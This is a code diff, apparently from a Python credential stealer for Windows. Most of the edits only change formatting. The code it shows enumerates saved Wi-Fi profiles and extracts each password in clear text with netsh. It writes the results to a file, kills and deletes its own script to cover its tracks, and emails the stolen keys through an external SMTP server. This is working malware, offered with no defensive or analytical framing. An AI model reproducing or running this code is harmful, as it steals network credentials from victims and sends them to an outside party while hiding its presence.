@@ -58,14 +58,17 @@ if os.name == "nt":
     substring = output[start:end]
     words_list = output.split()
     jungkook = 2
+
     with open(file_path + "\\" + sys_info, "w") as f:
         f.write("All reg conns: \n")
         f.close()
+        
     for wordblk in output.split():
         if wordblk == "Profile":
             next_word = words_list[words_list.index(wordblk) + jungkook]
             next_word = next_word.split("\\r\\n")[0]
-            knj = jungkook+1
+            knj = jungkook + 1
+
             try:
                 while "All" not in next_word:
                     next_word += " " + \
@@ -75,12 +78,16 @@ if os.name == "nt":
                 pass
 
             next_word = next_word.split('\\r\\n')[0]
+
             if ':' in next_word:
                 next_word = next_word.split(':')[1]
+
                 if ' ' in next_word:
                     next_word = next_word.replace(' ', "")
+
             wifi = subprocess.check_output('netsh wlan show profile ' + '"' + next_word + '"' + ' key=clear',
                                            shell=True)
+
             wifi = str(wifi)
             start = wifi.find("Key Content")
             end = wifi.find("Cost settings")
@@ -91,6 +98,7 @@ if os.name == "nt":
                 f.write(next_word + "\n")
                 f.close()
             jungkook += 5
+
             try:
                 next_word = words_list[words_list.index(key_content) + 2]
                 i = 2
@@ -111,15 +119,22 @@ if os.name == "nt":
         os.system("cd " + passwd)
         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
         print('File was closed.')
+
+    # except OSError:
         os.system("DEL " + os.path.basename(__file__))
     except OSError:
-        print('File is close.')
+        print('File is closed.')
+        # pass
 
     with open(sys_info) as f:
         lines = f.read()
+        #
+        # print(str(lines))
+    # message += str(lines)
 
     print(str(lines))
     message += str(lines)
+    # print(message)
 
     with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
         server.login(YOUR_USERNAME, YOUR_PASSWORD)
